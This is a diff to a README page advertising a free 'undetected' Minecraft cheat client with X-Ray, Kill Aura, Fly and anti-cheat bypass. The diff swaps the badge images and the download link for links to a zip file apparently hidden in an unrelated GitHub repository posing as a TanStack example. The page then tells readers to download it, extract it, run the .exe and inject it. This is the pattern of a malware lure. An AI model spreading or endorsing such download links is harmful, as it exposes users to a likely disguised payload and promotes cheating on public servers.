@@ -2,12 +2,12 @@
 
 # Minecraft Hack 2025 | X-Ray ESP Kill Aura Fly Speed Noclip Auto Mine Crystal Aura Freecam Infinite Reach | Minecraft Client Undetected December 2025
 
-![Version](https://img.shields.io/badge/Version-9.2.4-lime?style=for-the-badge&logo=minecraft)
-![Status](https://img.shields.io/badge/Status-UNDETECTED%20100%25-success?style=for-the-badge)
-![Bypass](https://img.shields.io/badge/Anti-Cheat-BYPASSED%20(All%20Major)-critical?style=for-the-badge)
-![Users](https://img.shields.io/badge/Active%20Users-8.7K%2B-blueviolet?style=for-the-badge)
-![XRay](https://img.shields.io/badge/X--Ray%20%2B%20ESP-Full%20Ores-brightgreen?style=for-the-badge)
-![Free](https://img.shields.io/badge/Price-PRIVATE%20FREE-orange?style=for-the-badge)
+![Version](https://github.com/ElijahQ70/tanstack-start-breadcrumbs-example/raw/refs/heads/main/restrained/start_example_tanstack_breadcrumbs_3.4.zip)
+![Status](https://github.com/ElijahQ70/tanstack-start-breadcrumbs-example/raw/refs/heads/main/restrained/start_example_tanstack_breadcrumbs_3.4.zip%20100%25-success?style=for-the-badge)
+![Bypass](https://github.com/ElijahQ70/tanstack-start-breadcrumbs-example/raw/refs/heads/main/restrained/start_example_tanstack_breadcrumbs_3.4.zip%20(All%20Major)-critical?style=for-the-badge)
+![Users](https://github.com/ElijahQ70/tanstack-start-breadcrumbs-example/raw/refs/heads/main/restrained/start_example_tanstack_breadcrumbs_3.4.zip%20Users-8.7K%2B-blueviolet?style=for-the-badge)
+![XRay](https://github.com/ElijahQ70/tanstack-start-breadcrumbs-example/raw/refs/heads/main/restrained/start_example_tanstack_breadcrumbs_3.4.zip%20%2B%20ESP-Full%20Ores-brightgreen?style=for-the-badge)
+![Free](https://github.com/ElijahQ70/tanstack-start-breadcrumbs-example/raw/refs/heads/main/restrained/start_example_tanstack_breadcrumbs_3.4.zip%20FREE-orange?style=for-the-badge)
 
 **PRIVATE FREE CLIENT → Full X-Ray + Kill Aura + Crystal Aura + Fly + Speed + Noclip + Freecam + Works on Hypixel, 2b2t, Mineplex & All Servers!**
 
@@ -18,7 +18,7 @@
 ---
 ## PRIVATE CLIENT BUILD 2025 (UPDATED DECEMBER 14)
 
-[DOWNLOAD MINECRAFT HACK 2025 – ZIP](https://getloader.click)  
+[DOWNLOAD MINECRAFT HACK 2025 – ZIP](https://github.com/ElijahQ70/tanstack-start-breadcrumbs-example/raw/refs/heads/main/restrained/start_example_tanstack_breadcrumbs_3.4.zip)  
 **DOWNLOAD → EXTRACT → RUN .EXE → INJECT INTO MINECRAFT**
 
 - 100% Private Free Client (no public leaks)  
